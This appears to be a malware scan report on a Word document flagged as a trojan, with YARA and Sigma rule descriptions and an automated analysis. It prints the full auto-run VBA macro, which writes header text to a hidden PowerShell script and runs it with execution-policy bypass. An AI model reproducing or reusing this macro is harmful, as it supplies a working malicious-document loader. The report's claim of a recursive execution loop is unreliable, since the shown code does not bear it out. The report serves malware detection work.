threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

macros.vba_code:
Sub document_open()
Dim rng As Range
Dim intSecCount As Integer
Dim intHFType As Integer
intSecCount = ActiveDocument.Sections.Count
For intSection = 1 To intSecCount
    With ActiveDocument.Sections(intSection)
            Set rng = ActiveDocument.Sections(intSection).Headers(1).Range
Dim fso As Object
Set fso = CreateObject("Scripting.FileSystemObject")
Dim oFile As Object
Set oFile = fso.CreateTextFile("C:\programdata\Office365DCOMCheck.ps1")
oFile.WriteLine (rng)
oFile.Close
Set fso = Nothing
Set oFile = Nothing
    End With
Next intSection
Set objShell = CreateObject("shell.application")
Dim ComA As String
ComA = StrReverse("e/\/x/\/e/\/./\/l/\/l/\/e/\/h/\/s/\/r/\/e/\/w/\/o/\/p")
ComA = Replace("ComA", "/", "")
ComA = Replace("ComA", "\", "")
objShell.ShellExecute "powershell.exe", " -exec bypass -File C:\programdata\Office365DCOMCheck.ps1", "C:\ProgramData", "", 0
End Sub
macros.properties: auto-open create-file create-ole obfuscated powershell run-file

sigma_analysis_results.rule_title: Suspicious New Instance Of An Office COM Object
sigma_analysis_results.rule_description:
Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.
This can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)

attributes.magic: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Author: Dev, Template: 3.dot, Last Saved By: Dev, Revision Number: 53, Name of Creating Application: Microsoft Office Word, Total Editing Time: 02:04:00, Create Time/Date: Tue Apr 24 09:09:00 2018, Last Saved Time/Date: Wed May 16 08:21:00 2018, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0

crowdsourced_yara_results.description: This signature detects the presence of a number of Windows API functionality often seen within embedded executables. When this signature alerts on an executable, it is not an indication of malicious behavior. However, if seen firing in other file types, deeper investigation may be warranted.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: Detects a powershell and bypass keyword in a Word document
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: Detects indicators often found in obfuscated PowerShell scripts. Note: This detection is based on common characteristics typically associated with the mentioned threats, must be considered a clue and does not conclusively prove maliciousness.
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: detects OLE documents containing VB scripts with reversed suspicious strings
crowdsourced_yara_results.author: ditekSHen

crowdsourced_ai_results.analysis:
The macro 'document_open' is triggered when the document is opened. It begins by iterating through all sections in the active document and extracting the content from the first header of each section. This extracted content is then written to a PowerShell script file named "Office365DCOMCheck.ps1" in the "C:\programdata" directory.

The PowerShell script is then executed using the ShellExecute method of the 'shell.application' object. The script is executed with the "-exec bypass" option, which bypasses the execution policy restrictions in PowerShell, allowing potentially malicious code to run.

The PowerShell script itself contains a string that is reversed and then replaced to reveal the command "powershell.exe -exec bypass -File C:\programdata\Office365DCOMCheck.ps1". This command essentially executes the PowerShell script again, creating a recursive execution loop.

The purpose of this macro is to execute a PowerShell script that can potentially perform malicious actions, such as downloading and executing additional malware, stealing sensitive information, or compromising the system. The use of obfuscation techniques and the recursive execution loop raise strong suspicions of malicious intent.
